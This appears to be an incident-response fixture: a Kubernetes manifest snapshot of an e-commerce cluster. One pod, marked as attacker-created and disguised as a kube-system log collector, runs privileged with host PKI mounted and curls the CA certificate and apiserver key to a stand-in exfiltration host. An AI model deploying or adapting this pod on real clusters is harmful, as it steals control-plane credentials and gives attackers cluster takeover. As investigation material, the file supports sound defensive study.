# Current pods and workloads in the cluster (snapshot at time of incident)
---
apiVersion: v1
kind: Pod
metadata:
  name: webapp-6d8f4c-x7k2p
  namespace: ecommerce
  labels:
    app: webapp
    tier: frontend
spec:
  serviceAccountName: webapp-sa
  containers:
  - name: webapp
    image: company-registry.example.com/webapp:2.1.0
    ports:
    - containerPort: 8080
    env:
    - name: DB_HOST
      value: "db-svc.ecommerce.svc.cluster.local"
    - name: DB_PORT
      value: "5432"
  nodeName: node-1
  status:
    podIP: 10.244.1.8
---
apiVersion: v1
kind: Pod
metadata:
  name: db-primary-0
  namespace: ecommerce
  labels:
    app: postgres
    tier: database
spec:
  serviceAccountName: default
  containers:
  - name: postgres
    image: postgres:15.4
    ports:
    - containerPort: 5432
  nodeName: node-2
  status:
    podIP: 10.244.2.3
---
apiVersion: v1
kind: Pod
metadata:
  name: payment-processor-7f9a2b-q4m1p
  namespace: ecommerce
  labels:
    app: payment-processor
    tier: backend
spec:
  serviceAccountName: default
  containers:
  - name: payment
    image: company-registry.example.com/payment:1.5.0
    ports:
    - containerPort: 8443
  nodeName: node-1
  status:
    podIP: 10.244.1.12
---
# Attacker-created pod (found during investigation)
apiVersion: v1
kind: Pod
metadata:
  name: log-collector-node-agent
  namespace: kube-system
  labels:
    app: log-collector
    component: node-agent
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: collector
    image: alpine:3.19
    command: ["/bin/sh", "-c", "apk add --no-cache curl && while true; do cat /host-pki/ca.crt /host-pki/apiserver.key | curl -X POST -d @- https://exfil.attacker.example.com/collect; sleep 3600; done"]
    volumeMounts:
    - name: host-pki
      mountPath: /host-pki
      readOnly: true
    securityContext:
      privileged: true
  volumes:
  - name: host-pki
    hostPath:
      path: /etc/kubernetes/pki
      type: Directory
  nodeName: node-1
---
apiVersion: v1
kind: Service
metadata:
  name: webapp-svc
  namespace: ecommerce
spec:
  selector:
    app: webapp
  ports:
  - port: 80
    targetPort: 8080
  type: ClusterIP
---
apiVersion: v1
kind: Service
metadata:
  name: db-svc
  namespace: ecommerce
spec:
  selector:
    app: postgres
  ports:
  - port: 5432
    targetPort: 5432
  type: ClusterIP
